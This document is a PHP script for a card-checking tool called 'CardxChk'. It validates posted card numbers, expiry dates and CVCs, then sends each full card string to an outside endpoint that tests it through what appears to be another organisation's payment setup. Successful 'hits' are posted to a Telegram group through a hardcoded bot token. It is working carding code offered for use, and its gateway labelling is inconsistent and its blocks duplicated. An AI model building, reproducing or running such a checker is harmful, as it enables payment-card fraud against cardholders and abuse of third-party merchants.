<?php
header('Content-Type: application/json');

// Enable error logging
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/paypal0.1$_debug.log');

// Include cron_sync.php for validateApiKey
require_once __DIR__ . '/refresh.php';

// Start session for user authentication
session_start([
    'cookie_secure' => isset($_SERVER['HTTPS']),
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

// Check if user is authenticated
if (!isset($_SESSION['user']) || $_SESSION['user']['auth_provider'] !== 'telegram') {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Forbidden Access', 'response' => 'Forbidden Access'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 403: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Validate API key
 $validation = validateApiKey();
if (!$validation['valid']) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

 $expectedApiKey = $validation['response']['apiKey'];
 $providedApiKey = $_SERVER['HTTP_X_API_KEY'] ?? '';
if ($providedApiKey !== $expectedApiKey) {
    http_response_code(401);
    $errorMsg = ['status' => 'ERROR', 'message' => 'Invalid API Key', 'response' => 'Invalid API Key'];
    file_put_contents(__DIR__ . '/paypal0.1$_debug.log', date('Y-m-d H:i:s') . ' Error 401: ' . json_encode($errorMsg) . PHP_EOL, FILE_APPEND);
    echo json_encode($errorMsg);
    exit;
}

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check for 3DS responses
function is3DAuthenticationResponse($response) {
    $responseUpper = strtoupper($response);
    return strpos($responseUpper, '3D_AUTHENTICATION') !== false ||
           strpos($responseUpper, '3DS') !== false ||
           strpos($responseUpper, 'THREE_D_SECURE') !== false ||
           strpos($responseUpper, 'REDIRECT') !== false;
}

// Function to format response (remove status prefix and brackets)
function formatResponse($response) {
    $statusPrefixPattern = '/^(APPROVED|CHARGED|DECLINED|3DS)\s*\[(.*)\]$/i';
    if (preg_match($statusPrefixPattern, $response, $match)) {
        return $match[2];
    }
    $bracketsPattern = '/^\[(.*)\]$/';
    if (preg_match($bracketsPattern, $response, $match)) {
        return $match[1];
    }
    return $response;
}

// Function to send Telegram notification
function sendTelegramNotification($card_details, $status, $response) {
    // Load Telegram Bot Token from environment (secure storage)
    $bot_token = getenv('TELEGRAM_BOT_TOKEN') ?: '8421537809:AAEfYzNtCmDviAMZXzxYt6juHbzaZGzZb6A'; // Replace with actual token in env
    $chat_id = '-1003204998888'; // Your group chat ID
    $group_link = 'https://t.me/+zkYtLxcu7QYxODg1';
    $site_link = 'https://cxchk.site';

    // Skip 3DS responses
    if (is3DAuthenticationResponse($response)) {
        log_message("Skipping Telegram notification for 3DS response: $response");
        return;
    }

    // Get user info from session
    $user_name = htmlspecialchars($_SESSION['user']['name'] ?? 'CardxChk User', ENT_QUOTES, 'UTF-8');
    $user_username = htmlspecialchars($_SESSION['user']['username'] ?? '', ENT_QUOTES, 'UTF-8');
    $user_profile_url = $user_username ? "https://t.me/" . str_replace('@', '', $user_username) : '#';
    $status_emoji = ($status === 'CHARGED') ? '🔥' : '✅';
    $gateway = 'Paypal 0.1$'; // Hardcoded for this gateway
    $formatted_response = formatResponse($response);

    // Construct Telegram message
    $message = "<b>✦━━[ 𝐇𝐈𝐓 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃! ]━━✦</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐔𝐬𝐞𝐫 ➳ <a href=\"$user_profile_url\">$user_name</a>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <b>$status $status_emoji</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ $gateway</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <i>$formatted_response</i>\n" .
               "<b>――――――――――――</b>\n" .
               "<a href=\"$group_link\">[⌇]</a> 𝐇𝐈𝐓 𝐕𝐈𝐀 ➳ <a href=\"$site_link\">𝑪𝑨𝑹𝑫 ✘ 𝑪𝑯𝑲</a>";

    // Send to Telegram
    $telegram_url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $payload = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true  // Added to prevent link previews
    ];

    $ch = curl_init($telegram_url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Changed to true for security
    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Added timeout
    $result = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    if ($http_code !== 200 || !$result) {
        log_message("Failed to send Telegram notification for $card_details: HTTP $http_code, Error: $curl_error, Response: " . ($result ?: 'No response'));
    } else {
        log_message("Telegram notification sent for $card_details: $status [$formatted_response]");
    }
}

// Check if card details are provided
if (!isset($_POST['card']) || !is_array($_POST['card'])) {
    echo json_encode(['status' => 'ERROR', 'message' => 'Card details not provided']);
    exit;
}




header('Content-Type: text/plain');

// Enable error reporting for debugging (remove in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Function to check a single card via API
function checkCard($card_number, $exp_month, $exp_year, $cvc) {
    // Prepare card details for API and display
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    
    // API endpoint configuration
    $api_url = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=shebrews.org/cc=$encoded_cc";

    // Initialize cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; consider enabling in production with proper SSL

    // Execute request
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);

    // Handle API errors
    if ($response === false || $http_code !== 200 || !empty($curl_error)) {
        return "DECLINED [API request failed: $curl_error (HTTP $http_code)] $card_details";
    }

    // Parse JSON response
    $result = json_decode($response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'], $result['response'])) {
        return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
    }

    $status = strtoupper($result['status']);
    $response_msg = htmlspecialchars($result['response'], ENT_QUOTES, 'UTF-8'); // Sanitize response message

    // Check if response contains "Succeeded" (case-insensitive)
    $is_succeeded = stripos($response_msg, 'Succeeded') !== false;
    
    // Output based on status
    if ($status === "APPROVED" || $is_succeeded) {
        // If it's a "Succeeded" response, change the message
        if ($is_succeeded) {
            return "[Payment Method added successfully.]";
        }
        return "[$response_msg]";
    } elseif ($status === "DECLINED") {
        return "[$response_msg]";
    } else {
        return "DECLINED [Unknown status: $status]";
    }
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

 $card = $_POST['card'];
 $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
 $card_number = preg_replace('/[^0-9]/', '', $card['number']);
 $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
 $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
 $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
 $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y'); // Last two digits of current year (e.g., 25 for 2025)
    $current_century = (int) (date('Y') - $current_year); // e.g., 2000 for 2025
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Basic validation
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    echo "DECLINED [Invalid card number format]";
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year)) {
    echo "DECLINED [Invalid exp_year format after normalization]";
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    echo "DECLINED [Invalid CVC format]";
    exit;
}

// Validate logical expiry
 $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
 $current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    echo "DECLINED [Card expired]";
    exit;
}

// Check single card
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
